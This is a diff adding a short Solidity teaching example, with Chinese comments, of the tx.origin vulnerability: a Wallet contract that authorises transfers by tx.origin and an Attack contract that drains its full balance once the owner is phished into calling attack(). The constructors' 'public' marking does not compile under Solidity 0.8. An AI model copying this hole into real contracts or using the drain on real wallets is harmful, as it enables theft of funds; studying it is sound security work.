@@ -1,0 +1,32 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+contract Wallet {
+    address public owner;
+    constructor() public {
+    owner = msg.sender;
+    }
+    function deposit() public payable {}
+    //一个存款的函数
+    function transfer(address payable _to, uint _amount) public {
+        require(tx.origin == owner, "not owner");
+        //这里的owner就等于msg.sender等于最初的部署合约的部署者
+        (bool sent,) = _to.call{value: _amount}("");
+        require(sent, "failed to sent");
+    }
+}
+
+contract Attack {
+    address payable public owner;
+    Wallet wallet;
+
+    constructor(Wallet _wallet) public {
+        wallet = Wallet(_wallet);
+        owner = payable(msg.sender);
+    }
+
+    function attack() public {
+        wallet.transfer(owner, address(wallet).balance);
+        //通过钓鱼当受害者调用我们恶意合约的transfer函数
+    }
+}
+   
